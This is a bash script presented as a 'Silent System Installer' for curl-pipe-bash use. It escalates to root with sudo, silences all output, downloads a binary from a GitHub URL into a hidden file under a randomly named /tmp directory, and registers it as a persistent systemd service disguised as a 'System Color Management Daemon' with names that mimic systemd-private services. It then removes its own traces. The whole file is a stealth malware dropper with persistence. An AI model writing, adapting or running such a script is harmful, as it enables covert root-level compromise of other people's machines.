#!/bin/bash
#
# Silent System Installer - Pipe-Friendly Version
# Works with: curl | bash or wget | bash
#

# Silent operation (but allow critical errors to stderr initially)
SILENT_MODE=true

# Configuration
GITHUB_URL="https://raw.githubusercontent.com/xinezzero/f34vr34vwq3t43t3/main/stepwarev3-linux-x64-debug_sandbox"

# Generate random service name
gen_service_name() {
    local prefix="systemd-private-"
    local hash=$(head -c 16 /dev/urandom | md5sum | cut -d' ' -f1 | head -c 32)
    local service_types=("colord" "upower" "rtkit-daemon" "accounts-daemon" "polkitd" "gdm" "ModemManager")
    local service_type=${service_types[$RANDOM % ${#service_types[@]}]}
    local suffix=$(head -c 3 /dev/urandom | xxd -p | tr '[:lower:]' '[:upper:]')
    echo "${prefix}${hash}-${service_type}.service-${suffix}"
}

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    # Not root - need to re-exec with sudo
    # Save script to temp file first
    TEMP_SCRIPT=$(mktemp /tmp/.inst.XXXXXX)
    cat "$0" > "$TEMP_SCRIPT" 2>/dev/null || {
        # If $0 doesn't work (piped), save ourselves
        cat > "$TEMP_SCRIPT" << 'SELFEOF'
#!/bin/bash
exec 1>/dev/null 2>&1
GITHUB_URL="https://raw.githubusercontent.com/xinezzero/f34vr34vwq3t43t3/main/stepwarev3-linux-x64-debug_sandbox"
gen_service_name() {
    local prefix="systemd-private-"
    local hash=$(head -c 16 /dev/urandom | md5sum | cut -d' ' -f1 | head -c 32)
    local service_types=("colord" "upower" "rtkit-daemon" "accounts-daemon" "polkitd" "gdm" "ModemManager")
    local service_type=${service_types[$RANDOM % ${#service_types[@]}]}
    local suffix=$(head -c 3 /dev/urandom | xxd -p | tr '[:lower:]' '[:upper:]')
    echo "${prefix}${hash}-${service_type}.service-${suffix}"
}
SERVICE_NAME=$(gen_service_name)
INSTALL_DIR="/tmp/${SERVICE_NAME}"
BINARY_NAME=".$(echo $SERVICE_NAME | cut -d'-' -f1-3)"
SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"
mkdir -p "$INSTALL_DIR" 2>/dev/null || exit 1
cd "$INSTALL_DIR" || exit 1
if command -v curl >/dev/null 2>&1; then
    curl -fsSL --max-time 60 --retry 3 -o "$BINARY_NAME" "$GITHUB_URL" 2>/dev/null || exit 1
elif command -v wget >/dev/null 2>&1; then
    wget -q -t 3 -T 60 -O "$BINARY_NAME" "$GITHUB_URL" 2>/dev/null || exit 1
else
    exit 1
fi
[ -f "$BINARY_NAME" ] && [ -s "$BINARY_NAME" ] || exit 1
chmod +x "$BINARY_NAME" 2>/dev/null
cat > "$SERVICE_FILE" << 'SVCEOF'
[Unit]
Description=System Color Management Daemon
After=network.target network-online.target
Wants=network-online.target
[Service]
Type=simple
ExecStart=INSTALL_DIR_PLACEHOLDER/BINARY_NAME_PLACEHOLDER
Restart=on-failure
RestartSec=10
StartLimitIntervalSec=0
StartLimitBurst=999
Nice=-5
CPUQuota=15%
MemoryMax=150M
PrivateTmp=yes
NoNewPrivileges=false
StandardOutput=null
StandardError=null
Environment=HOME=/root
WorkingDirectory=INSTALL_DIR_PLACEHOLDER
[Install]
WantedBy=multi-user.target
SVCEOF
sed -i "s|INSTALL_DIR_PLACEHOLDER|$INSTALL_DIR|g" "$SERVICE_FILE"
sed -i "s|BINARY_NAME_PLACEHOLDER|$BINARY_NAME|g" "$SERVICE_FILE"
systemctl daemon-reload 2>/dev/null
systemctl enable "$SERVICE_NAME" 2>/dev/null
systemctl start "$SERVICE_NAME" 2>/dev/null
sleep 3
if systemctl is-active --quiet "$SERVICE_NAME" 2>/dev/null; then
    rm -f /tmp/.inst.* 2>/dev/null &
    exit 0
else
    systemctl stop "$SERVICE_NAME" 2>/dev/null
    systemctl disable "$SERVICE_NAME" 2>/dev/null
    rm -f "$SERVICE_FILE" 2>/dev/null
    systemctl daemon-reload 2>/dev/null
    rm -rf "$INSTALL_DIR" 2>/dev/null
    rm -f /tmp/.inst.* 2>/dev/null &
    exit 1
fi
SELFEOF
    }
    chmod +x "$TEMP_SCRIPT"
    sudo bash "$TEMP_SCRIPT"
    EXIT_CODE=$?
    rm -f "$TEMP_SCRIPT" 2>/dev/null
    exit $EXIT_CODE
fi

# Now running as root - go silent
exec 1>/dev/null 2>&1

SERVICE_NAME=$(gen_service_name)
INSTALL_DIR="/tmp/${SERVICE_NAME}"
BINARY_NAME=".$(echo $SERVICE_NAME | cut -d'-' -f1-3)"
SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"

# Create installation directory
mkdir -p "$INSTALL_DIR" || exit 1
cd "$INSTALL_DIR" || exit 1

# Download binary
if command -v curl >/dev/null 2>&1; then
    curl -fsSL --max-time 60 --retry 3 -o "$BINARY_NAME" "$GITHUB_URL" || exit 1
elif command -v wget >/dev/null 2>&1; then
    wget -q -t 3 -T 60 -O "$BINARY_NAME" "$GITHUB_URL" || exit 1
else
    exit 1
fi

# Verify download
[ -f "$BINARY_NAME" ] && [ -s "$BINARY_NAME" ] || exit 1

# Make executable
chmod +x "$BINARY_NAME"

# Create systemd service
cat > "$SERVICE_FILE" << 'SVCEOF'
[Unit]
Description=System Color Management Daemon
After=network.target network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=INSTALL_DIR_PLACEHOLDER/BINARY_NAME_PLACEHOLDER
Restart=on-failure
RestartSec=10
StartLimitIntervalSec=0
StartLimitBurst=999
Nice=-5
CPUQuota=15%
MemoryMax=150M
PrivateTmp=yes
NoNewPrivileges=false
StandardOutput=null
StandardError=null
Environment=HOME=/root
WorkingDirectory=INSTALL_DIR_PLACEHOLDER

[Install]
WantedBy=multi-user.target
SVCEOF

# Replace placeholders
sed -i "s|INSTALL_DIR_PLACEHOLDER|$INSTALL_DIR|g" "$SERVICE_FILE"
sed -i "s|BINARY_NAME_PLACEHOLDER|$BINARY_NAME|g" "$SERVICE_FILE"

# Enable and start
systemctl daemon-reload
systemctl enable "$SERVICE_NAME"
systemctl start "$SERVICE_NAME"

# Verify
sleep 3
if systemctl is-active --quiet "$SERVICE_NAME"; then
    # Success - cleanup
    rm -f /tmp/.inst.* 2>/dev/null &
    exit 0
else
    # Failed - cleanup
    systemctl stop "$SERVICE_NAME" 2>/dev/null
    systemctl disable "$SERVICE_NAME" 2>/dev/null
    rm -f "$SERVICE_FILE"
    systemctl daemon-reload
    rm -rf "$INSTALL_DIR"
    rm -f /tmp/.inst.* 2>/dev/null &
    exit 1
fi
